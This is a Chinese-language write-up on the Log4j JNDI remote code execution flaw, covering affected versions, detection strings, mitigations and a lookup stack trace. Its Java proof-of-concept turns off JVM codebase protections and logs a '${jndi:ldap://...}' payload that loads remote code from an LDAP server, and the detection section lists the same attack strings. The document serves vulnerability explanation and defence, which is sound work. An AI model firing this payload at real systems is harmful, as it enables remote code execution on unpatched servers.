## 1.log4j漏洞说明
Apache Log4j存在递归解析功能，未取得身份认证的用户，可以从远程发送数据请求输入数据日志，轻松触发漏洞，最终在目标上执行任意代码
## 2.错误说明

* 影响范围

  Apache Log4j 2.x <= 2.15.0-rc1 
  受影响的应用及组件（包括但不限于）如下： Apache Solr、Apache Flink、Apache Druid、Apache Struts2、srping-boot-strater-log4j2等。

* 攻击检测 
  可以通过检查日志中是否存在“jndi:ldap://”、“jndi:rmi”等字符来发现可能的攻击行为。
  检查日志中是否存在相关堆栈报错，堆栈里是否有JndiLookup、ldapURLContext、getObjectFactoryFromReference等与 jndi 调用相关的堆栈信息。
  

## 3.示例代码
* 示例代码

```
public class log4jTest {
    private static final Logger logger = LogManager.getLogger(log4jTest.class);
    public static void main(String[] args) {
    	try {
			// 避免因为Java版本过高而无法触发此漏洞
			System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
			System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
			System.out.println("start: " + System.currentTimeMillis() );
			// 此处ip需要使用本机局域网ip或网络ip，不能使用127.0.0.1
			logger.error("${jndi:ldap://192.168.1.20:1389/Basic/Command/calc}");
			System.out.println("end:   " + System.currentTimeMillis() );
		} catch (Exception e){
    		e.printStackTrace();
		}

    }
}
```
## 4.修正

* 添加jvm参数启动参数

```
-Dlog4j2.formatMsgNoLookups=true
```

* 升级版本log版本

```
log4j-2.15.0-rc2
```

* 其他修正
  * 启动配置：log4j2.formatMsgNoLookups=True，不建议，不如升级版本
  * 设置系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 为 true
  * 采用 rasp 对lookup的调用进行阻断
  * 采用waf对请求流量中的${jndi进行拦截
  * 禁止不必要的业务访问外网【这个也不建议，影响业务线程阻塞】

## 5.漏洞堆栈
```
"main" #1 prio=5 os_prio=31 tid=0x00007fc01e807000 nid=0x2703 runnable [0x000070000b944000]
   java.lang.Thread.State: RUNNABLE
	at java.net.PlainSocketImpl.socketConnect(Native Method)
	at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350)
	- locked <0x0000000796c8d0d0> (a java.net.SocksSocketImpl)
	at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)
	at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)
	at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)
	at java.net.Socket.connect(Socket.java:606)
	at java.net.Socket.connect(Socket.java:555)
	at java.net.Socket.<init>(Socket.java:451)
	at java.net.Socket.<init>(Socket.java:228)
	at com.sun.jndi.ldap.Connection.createSocket(Connection.java:375)
	at com.sun.jndi.ldap.Connection.<init>(Connection.java:215)
	at com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)
	at com.sun.jndi.ldap.LdapClient.getInstance(LdapClient.java:1609)
	at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2749)
	at com.sun.jndi.ldap.LdapCtx.<init>(LdapCtx.java:319)
	at com.sun.jndi.url.ldap.ldapURLContextFactory.getUsingURLIgnoreRootDN(ldapURLContextFactory.java:60)
	at com.sun.jndi.url.ldap.ldapURLContext.getRootURLContext(ldapURLContext.java:61)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:202)
	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
	at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)
	at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:221)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1110)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1033)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:912)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:467)
	at org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:132)
	at org.apache.logging.log4j.core.pattern.PatternFormatter.format(PatternFormatter.java:38)
	at org.apache.logging.log4j.core.layout.PatternLayout$PatternSerializer.toSerializable(PatternLayout.java:344)
	at org.apache.logging.log4j.core.layout.PatternLayout.toText(PatternLayout.java:244)
	at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:229)
	at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:59)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.directEncodeEvent(AbstractOutputStreamAppender.java:197)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.tryAppend(AbstractOutputStreamAppender.java:190)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append(AbstractOutputStreamAppender.java:181)
	at org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:156)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppender0(AppenderControl.java:129)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppenderPreventRecursion(AppenderControl.java:120)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:84)
	at org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:540)
	at org.apache.logging.log4j.core.config.LoggerConfig.processLogEvent(LoggerConfig.java:498)
	at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:481)
	at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:456)
	at org.apache.logging.log4j.core.config.DefaultReliabilityStrategy.log(DefaultReliabilityStrategy.java:63)
	at org.apache.logging.log4j.core.Logger.log(Logger.java:161)
	at org.apache.logging.log4j.spi.AbstractLogger.tryLogMessage(AbstractLogger.java:2205)
	at org.apache.logging.log4j.spi.AbstractLogger.logMessageTrackRecursion(AbstractLogger.java:2159)
	at org.apache.logging.log4j.spi.AbstractLogger.logMessageSafely(AbstractLogger.java:2142)
	at org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:2017)
	at org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:1983)
	at org.apache.logging.log4j.spi.AbstractLogger.error(AbstractLogger.java:740)
	at log4jRCE.main(log4jRCE.java:16)

```